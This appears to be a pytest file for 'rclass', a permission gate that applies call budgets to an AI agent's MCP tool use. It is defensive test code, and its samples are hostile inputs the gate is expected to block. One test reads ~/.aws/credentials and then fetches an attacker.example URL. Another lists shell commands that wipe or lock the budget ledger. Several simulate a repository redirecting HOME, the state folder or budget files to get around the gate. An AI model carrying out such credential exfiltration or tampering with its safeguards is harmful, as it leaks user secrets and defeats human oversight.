"""R2 budgets (rclass/budgets.py): compensable calls run unprompted up to a limit; nothing else ever does."""

import io
import json
import threading
from pathlib import Path

import pytest

from rclass import audit, budgets, gate
from rclass.cli import main
from rclass.model import RClass
from rclass.registry import Registry

from test_gate import CONFIG, REG, hook


@pytest.fixture
def project(tmp_path):
    proj, home = tmp_path / "proj", tmp_path / "home"
    proj.mkdir(), home.mkdir()
    (proj / ".mcp.json").write_text(json.dumps(CONFIG))
    return proj, home


@pytest.fixture(autouse=True)
def isolated(monkeypatch, tmp_path):
    monkeypatch.setenv("RCLASS_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.delenv("CLAUDE_PROJECT_DIR", raising=False)


def policy(text, **kw):
    return gate.GatePolicy(budgets=budgets.parse(__import__("yaml").safe_load(text), "<test>"), **kw)


TABLES = """
budgets:
  - name: tables
    server: sqlite
    tools: [create_table]
    max_calls: 2
"""


def test_r2_within_budget_is_allowed_then_asks(project):
    p = policy(TABLES)
    for n in (1, 2):
        out = hook(project, "mcp__db__create_table", {"query": "CREATE TABLE t (x)"}, p)
        assert out["permissionDecision"] == "allow"
        assert f"within budget 'tables': call {n} of 2 this session" in out["permissionDecisionReason"]
    assert hook(project, "mcp__db__create_table", {"query": "CREATE TABLE u (x)"}, p)["permissionDecision"] == "ask"


def test_session_budgets_are_per_session(project):
    p = policy(TABLES.replace("max_calls: 2", "max_calls: 1"))
    assert hook(project, "mcp__db__create_table", {}, p, session="a")["permissionDecision"] == "allow"
    assert hook(project, "mcp__db__create_table", {}, p, session="a")["permissionDecision"] == "ask"
    assert hook(project, "mcp__db__create_table", {}, p, session="b")["permissionDecision"] == "allow"


def test_user_budgets_span_sessions(project):
    p = policy("""
budgets:
  - {name: t, server: sqlite, tools: [create_table], max_calls: 1, window: 1d, scope: user}
""")
    assert hook(project, "mcp__db__create_table", {}, p, session="a")["permissionDecision"] == "allow"
    assert hook(project, "mcp__db__create_table", {}, p, session="b")["permissionDecision"] == "ask"


def test_window_expires(tmp_path):
    b = budgets.parse({"budgets": [{"name": "t", "server": "sqlite", "max_calls": 1, "window": "1h"}]}, "<t>")[0]
    led = budgets.Ledger(tmp_path)
    assert led.try_spend(b, "s", None, now=1000.0)
    assert led.try_spend(b, "s", None, now=1000.0 + 3599) is None
    assert led.try_spend(b, "s", None, now=1000.0 + 3600)


@pytest.mark.parametrize("tool,args", [
    ("mcp__db__write_query", {"query": "DROP TABLE t"}),   # R4
    ("mcp__mystery__anything", {}),                        # unrecognised
    ("mcp__spoof__write_file", {}),                        # spoofed launcher
])
def test_never_r3_r4_or_unrecognised(project, tool, args):
    p = policy("""
budgets:
  - {name: all-sqlite, server: sqlite, max_calls: 100}
  - {name: all-fs, server: filesystem, max_calls: 100}
""")
    assert hook(project, tool, args, p)["permissionDecision"] == "ask"


def test_tools_default_to_every_r2_tool_of_the_server(project):
    p = policy("budgets:\n  - {name: s, server: sqlite, max_calls: 5}\n")
    assert hook(project, "mcp__db__append_insight", {"insight": "x"}, p)["permissionDecision"] == "allow"
    assert hook(project, "mcp__db__write_query", {"query": "DELETE FROM t"}, p)["permissionDecision"] == "ask"


def test_budget_is_keyed_by_record_not_config_name(project):
    p = policy("budgets:\n  - {name: s, server: db, max_calls: 5}\n")  # 'db' is a config name, not a record
    assert hook(project, "mcp__db__create_table", {}, p)["permissionDecision"] == "ask"


def test_session_guard_raise_is_never_budgeted(project, tmp_path):
    # An egress-flagged R2 tool raised to R4 by the guard must ask, even with a budget for that server.
    reg_dir = tmp_path / "reg"
    reg_dir.mkdir()
    (reg_dir / "poster.yaml").write_text("""
spec_version: '0.3'
server: {id: poster, name: Poster, source: https://example.com/poster, evidence: [https://example.com/poster],
  version: '1', packages: [poster-mcp]}
tools:
- {name: post, class: R2, egress: true, rationale: Posts a draft to a destination the caller chooses.}
- {name: list, class: R0, rationale: Lists drafts.}
""")
    reg = Registry.bundled()
    for rec in Registry.from_paths([reg_dir]).records:
        reg.add(rec, reg_dir)
    proj, home = project
    (proj / ".mcp.json").write_text(json.dumps({"mcpServers": {"p": {"command": "npx", "args": ["-y", "poster-mcp"]}}}))
    p = policy("budgets:\n  - {name: posts, server: poster, max_calls: 5}\n")

    def call(tool, args):
        event = json.dumps({"session_id": "g", "cwd": str(proj), "hook_event_name": "PreToolUse",
                            "tool_name": tool, "tool_input": args})
        out = io.StringIO()
        gate.run_hook(io.StringIO(event), out, p, lambda: reg, home=home)
        return json.loads(out.getvalue())["hookSpecificOutput"] if out.getvalue().strip() else None

    assert call("mcp__p__post", {"url": "https://a.example"})["permissionDecision"] == "allow"  # nothing read yet
    call("mcp__p__list", {})
    out = call("mcp__p__post", {"url": "https://a.example"})
    assert out["permissionDecision"] == "ask" and "SPEC 9" in out["permissionDecisionReason"]


def test_deny_from_r2_wins_over_a_budget(project):
    p = policy(TABLES, deny_from=RClass.R2)
    assert hook(project, "mcp__db__create_table", {}, p)["permissionDecision"] == "deny"


AMOUNTS = """
budgets:
  - name: inserts
    server: sqlite
    tools: [append_insight]
    max_calls: 10
    where: {topic: sales}
    amount: {arg: meta.cost, max_each: 50, max_total: 80}
"""


@pytest.mark.parametrize("args", [
    {"topic": "sales"},                                        # no amount
    {"topic": "sales", "meta": {"cost": "lots"}},              # not a number
    {"topic": "sales", "meta": {"cost": -1}},                  # negative
    {"topic": "sales", "meta": {"cost": True}},                # bool is not a number
    {"topic": "sales", "meta": {"cost": 51}},                  # over max_each
    {"topic": "hr", "meta": {"cost": 1}},                      # `where` doesn't match
])
def test_amount_must_be_present_and_within_limits(project, args):
    assert hook(project, "mcp__db__append_insight", args, policy(AMOUNTS))["permissionDecision"] == "ask"


def test_amount_total(project):
    p = policy(AMOUNTS)

    def call(c):
        return hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": c}}, p)
    assert call(50)["permissionDecision"] == "allow"
    out = call(30)
    assert out["permissionDecision"] == "allow" and "meta.cost 80 of 80" in out["permissionDecisionReason"]
    assert call(1)["permissionDecision"] == "ask"


def test_refused_call_spends_nothing(project):
    p = policy(AMOUNTS)
    assert hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": 60}}, p)["permissionDecision"] == "ask"
    assert hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": 50}}, p)["permissionDecision"] == "allow"


def test_parallel_calls_cannot_overspend(tmp_path):
    b = budgets.parse({"budgets": [{"name": "t", "server": "sqlite", "max_calls": 5, "window": "1d",
                                    "scope": "user"}]}, "<t>")[0]
    led = budgets.Ledger(tmp_path)
    got = []
    threads = [threading.Thread(target=lambda: got.append(led.try_spend(b, None, None))) for _ in range(20)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert sum(1 for g in got if g) == 5


def test_unreadable_ledger_asks(project, tmp_path):
    (tmp_path / "state" / "rclass").mkdir(parents=True, exist_ok=True)
    (tmp_path / "state" / "rclass" / "budgets.json").write_text("{not json")
    assert hook(project, "mcp__db__create_table", {}, policy(TABLES))["permissionDecision"] == "ask"


def test_audit_log_and_report_show_the_budget(project, tmp_path):
    log = tmp_path / "audit.jsonl"
    p = policy(TABLES)
    proj, home = project
    for i in (1, 2):
        ev = {"session_id": "s", "cwd": str(proj), "hook_event_name": "PreToolUse", "tool_use_id": f"t{i}",
              "tool_name": "mcp__db__create_table", "tool_input": {}}
        gate.run_hook(io.StringIO(json.dumps(ev)), io.StringIO(), p, lambda: REG, log_path=log, home=home)
    ev["hook_event_name"] = "PostToolUse"
    gate.run_hook(io.StringIO(json.dumps(ev)), io.StringIO(), p, lambda: REG, log_path=log, home=home)
    lines = [json.loads(x) for x in log.read_text().splitlines()]
    assert lines[0]["decision"] == "allow" and lines[0]["budget"] == {"name": "tables", "calls": 1, "max_calls": 2}
    assert audit.verify(log)[0]
    rows = audit.report(lines)  # default min class R3, but budgeted R2 calls are still reported
    assert [r["outcome"] for r in rows] == ["allowed within budget 'tables' (call 1 of 2), did not run",
                                            "ran within budget 'tables' (call 2 of 2)"]


@pytest.mark.parametrize("doc,err", [
    ({"budgets": [{"server": "sqlite", "max_calls": 1}]}, "needs `name`"),
    ({"budgets": [{"name": "a", "max_calls": 1}]}, "needs `server`"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": -1}]}, "max_calls"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": True}]}, "max_calls"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "window": "1w"}]}, "window"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "window": "0h"}]}, "window"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "scope": "user"}]}, "needs a `window`"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "amount": {"arg": "x"}}]}, "max_each"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "amount": {"arg": "x", "max_each": "5"}}]}, "number"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1, "class": "R3"}]}, "unknown field"),
    ({"budgets": [{"name": "a", "server": "s", "max_calls": 1}, {"name": "a", "server": "s", "max_calls": 1}]}, "two budgets"),
    ({"budget": []}, "`budgets` list"),
])
def test_parse_errors(doc, err):
    with pytest.raises(budgets.BudgetError, match=err):
        budgets.parse(doc, "<t>")


def test_check_against_registry():
    with pytest.raises(budgets.BudgetError, match="doesn't have"):
        budgets.check(budgets.parse({"budgets": [{"name": "a", "server": "nope", "max_calls": 1}]}, "<t>"), REG)
    with pytest.raises(budgets.BudgetError, match="tool 'nope'"):
        budgets.check(budgets.parse({"budgets": [{"name": "a", "server": "sqlite", "tools": ["nope"],
                                                  "max_calls": 1}]}, "<t>"), REG)


def test_cli_check_and_hook_misconfiguration(tmp_path, capsys, monkeypatch):
    f = tmp_path / "b.yaml"
    f.write_text(TABLES)
    assert main(["budgets", "check", str(f)]) == 0
    out = capsys.readouterr()
    assert "tables: sqlite (create_table), 2 calls per session" in out.out
    assert "warning: you can edit" in out.err
    bad = tmp_path / "bad.yaml"
    bad.write_text("budgets: [{name: a, server: sqlite}]")
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"tool_name": "mcp__db__create_table"})))
    assert main(["hook", "claude-code", "--budgets", str(bad)]) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_generated_hook_settings_carry_budgets_as_absolute_paths(tmp_path, capsys, monkeypatch):
    f = tmp_path / "b.yaml"
    f.write_text(TABLES)
    monkeypatch.chdir(tmp_path)
    assert main(["policy", "--format", "claude-hook", "--budgets", "b.yaml"]) == 0
    cmd = json.loads(capsys.readouterr().out)["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
    assert f"--budgets {f.resolve()}" in cmd


def test_env_default_path(tmp_path, monkeypatch):
    f = tmp_path / "b.yaml"
    f.write_text(TABLES)
    monkeypatch.setenv("RCLASS_BUDGETS", str(f))
    assert [b.name for b in budgets.load(budgets.default_paths())] == ["tables"]


# --------------------------------------------------------------------------- review findings (each one a regression test)

@pytest.mark.parametrize("cost", [float("nan"), float("inf"), "nan", "1e3", "50", " 5", 10**400])
def test_amount_must_be_a_finite_json_number(project, cost):
    out = hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": cost}}, policy(AMOUNTS))
    assert out["permissionDecision"] == "ask"


def test_nan_cannot_disable_the_total(project):
    p = policy(AMOUNTS)
    hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": float("nan")}}, p)
    ok = [hook(project, "mcp__db__append_insight", {"topic": "sales", "meta": {"cost": 40}}, p)["permissionDecision"]
          for _ in range(3)]
    assert ok == ["allow", "allow", "ask"]  # 80 is the total


@pytest.mark.parametrize("limit", [".nan", ".inf"])
def test_non_finite_limits_are_rejected(limit):
    with pytest.raises(budgets.BudgetError, match="finite"):
        policy(f"budgets:\n  - {{name: a, server: sqlite, max_calls: 1, amount: {{arg: x, max_each: {limit}}}}}\n")


def test_first_matching_budget_decides(project):
    p = policy(AMOUNTS + "  - {name: any-r2, server: sqlite, max_calls: 100}\n")
    call = lambda args: hook(project, "mcp__db__append_insight", args, p)  # noqa: E731
    assert call({"topic": "sales", "meta": {"cost": 10**6}})["permissionDecision"] == "ask"
    assert call({"topic": "sales"})["permissionDecision"] == "ask"
    out = call({"topic": "hr"})  # doesn't match the amount budget's `where`, so the broad one applies
    assert out["permissionDecision"] == "allow" and "'any-r2'" in out["permissionDecisionReason"]


@pytest.mark.parametrize("cmd", ["rm -f ~/.local/state/rclass/budgets.json", "echo '{}' > $HOME/.local/state/rclass/budgets.json",
                                 "flock ~/.local/state/rclass/budgets.lock sleep 600 &"])
def test_ledger_is_guarded(cmd):
    assert gate.touches_guard("Bash", {"command": cmd})


def _hold(lock_path, held, release):
    import fcntl
    lock_path.parent.mkdir(parents=True, exist_ok=True)
    with open(lock_path, "a+") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        held.set()
        release.wait(10)


@pytest.mark.parametrize("which", ["budgets.lock", "sessions"])
def test_a_held_lock_never_stalls_the_hook(project, tmp_path, which):
    pytest.importorskip("fcntl")
    import time
    p = policy(TABLES)
    hook(project, "mcp__db__list_tables", {}, p)  # creates the session file
    root = tmp_path / "state" / "rclass"
    lock = root / "budgets.lock" if which == "budgets.lock" else next((root / "sessions").glob("*.lock"))
    held, release = threading.Event(), threading.Event()
    t = threading.Thread(target=_hold, args=(lock, held, release))
    t.start()
    held.wait(5)
    try:
        start = time.monotonic()
        out = hook(project, "mcp__db__create_table", {}, p)
        assert time.monotonic() - start < 10
        if which == "budgets.lock":
            assert out["permissionDecision"] == "ask"  # no budget without the lock
    finally:
        release.set()
        t.join()


def test_policy_claude_hook_checks_budgets_against_the_registry(tmp_path, capsys):
    f = tmp_path / "b.yaml"
    f.write_text("budgets:\n  - {name: typo, server: sqlitee, max_calls: 1}\n")
    assert main(["policy", "--format", "claude-hook", "--budgets", str(f)]) == 2
    assert "sqlitee" in capsys.readouterr().err


def test_ledger_drops_old_session_counts(tmp_path):
    b = budgets.parse({"budgets": [{"name": "t", "server": "sqlite", "max_calls": 9}]}, "<t>")[0]
    led = budgets.Ledger(tmp_path)
    led.try_spend(b, "old", None, now=0.0)
    led.try_spend(b, "new", None, now=budgets.Ledger.KEEP + 10)
    assert list(json.loads((tmp_path / "budgets.json").read_text())) == ["t@new"]


# --------------------------------------------------------------------------- files a repository could name

def test_repository_cannot_supply_a_budget_file(project, monkeypatch, capsys):
    proj, _ = project
    (proj / "b.yaml").write_text(TABLES)
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
    monkeypatch.setenv("RCLASS_BUDGETS", str(proj / "b.yaml"))  # as a repo's .claude/settings.json `env` could
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(
        {"session_id": "s", "cwd": str(proj), "hook_event_name": "PreToolUse", "tool_name": "mcp__db__create_table"})))
    assert main(["hook", "claude-code", "--no-log"]) == 0
    out = json.loads(capsys.readouterr().out)["hookSpecificOutput"]
    assert out["permissionDecision"] == "ask" and "budget" not in out["permissionDecisionReason"]
    assert budgets.default_paths() == []  # inside a hook, RCLASS_BUDGETS is ignored
    with pytest.raises(budgets.BudgetError, match="inside the project folder"):  # and a flag can't name one either
        budgets.refuse_project_files([proj / "b.yaml"])


def test_repository_cannot_supply_a_server_mapping(project, monkeypatch):
    from rclass import servers
    proj, _ = project
    (proj / "m.yaml").write_text("servers: []\n")
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
    monkeypatch.setenv("RCLASS_SERVERS", str(proj / "m.yaml"))
    assert servers.default_paths() == []  # ignored inside a hook
    with pytest.raises(servers.MappingError, match="inside the project folder"):
        servers.refuse_project_files([proj / "sub" / ".." / "m.yaml"])


@pytest.mark.parametrize("var", ["RCLASS_STATE_DIR", "XDG_STATE_HOME"])
def test_repository_cannot_move_the_state_folder(project, monkeypatch, tmp_path, var):
    from rclass import trust
    proj, _ = project
    monkeypatch.setattr(gate, "STATE_DIR", None)
    monkeypatch.delenv("RCLASS_STATE_DIR")
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
    monkeypatch.setenv(var, "/tmp/anywhere-outside")  # even outside the project: a fresh folder resets budgets
    monkeypatch.setenv("HOME", str(proj))
    assert gate.state_dir() == trust.real_home() / ".local/state" / "rclass"
    monkeypatch.delenv("CLAUDE_PROJECT_DIR")
    assert gate.state_dir() == Path("/tmp/anywhere-outside/rclass")  # a person running rclass: honoured


def test_repository_cannot_set_home(project, monkeypatch):
    """A repository's settings pointing HOME at itself would make its .claude.json the user's config."""
    proj, home = project
    (proj / ".claude.json").write_text(json.dumps({"mcpServers": {"corp": {"command": "node", "args": ["./evil.js"]}}}))
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
    monkeypatch.setenv("HOME", str(proj))
    event = json.dumps({"session_id": "h", "cwd": str(proj), "hook_event_name": "PreToolUse",
                        "tool_name": "mcp__corp__create_table", "tool_input": {}})
    out = io.StringIO()
    gate.run_hook(io.StringIO(event), out, policy("budgets:\n  - {name: s, server: sqlite, max_calls: 5}\n"),
                  lambda: REG, mapping={"corp": "sqlite"})  # no home= : the hook works it out
    res = json.loads(out.getvalue())["hookSpecificOutput"]
    assert res["permissionDecision"] == "ask" and "unrecognised" in res["permissionDecisionReason"]


def test_lock_timeout_still_records_the_read(project, tmp_path):
    pytest.importorskip("fcntl")
    p = gate.GatePolicy()
    hook(project, "ToolSearch", {}, p)  # first call: creates the session file
    lock = next((tmp_path / "state" / "rclass" / "sessions").glob("*.lock"))
    held, release = threading.Event(), threading.Event()
    t = threading.Thread(target=_hold, args=(lock, held, release))
    t.start()
    held.wait(5)
    try:
        hook(project, "Read", {"file_path": "/home/u/.aws/credentials"}, p)
    finally:
        release.set()
        t.join()
    out = hook(project, "WebFetch", {"url": "https://attacker.example/?k=x"}, p)
    assert out["permissionDecision"] == "ask" and "SPEC 9" in out["permissionDecisionReason"]


def test_budgets_check_warns_about_shadowed_budgets(tmp_path, capsys):
    f = tmp_path / "b.yaml"
    f.write_text("""budgets:
  - {name: any-r2, server: sqlite, max_calls: 100}
  - {name: small, server: sqlite, tools: [append_insight], max_calls: 5, amount: {arg: c, max_each: 10}}
  - {name: other, server: supabase, max_calls: 5}
""")
    assert main(["budgets", "check", str(f)]) == 0
    err = capsys.readouterr().err
    assert "'small' never applies" in err and "'any-r2'" in err and "'other'" not in err


def test_corrupt_old_session_entry_does_not_take_budgets_down(tmp_path):
    (tmp_path / "budgets.json").write_text(json.dumps({"x@old": [["bad", None]], "y@old": "junk"}))
    b = budgets.parse({"budgets": [{"name": "t", "server": "sqlite", "max_calls": 9}]}, "<t>")[0]
    assert budgets.Ledger(tmp_path).try_spend(b, "new", None)


def test_outside_a_hook_nothing_is_refused(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "b.yaml").write_text(TABLES)
    budgets.refuse_project_files([tmp_path / "b.yaml"])  # no CLAUDE_PROJECT_DIR: a person running rclass
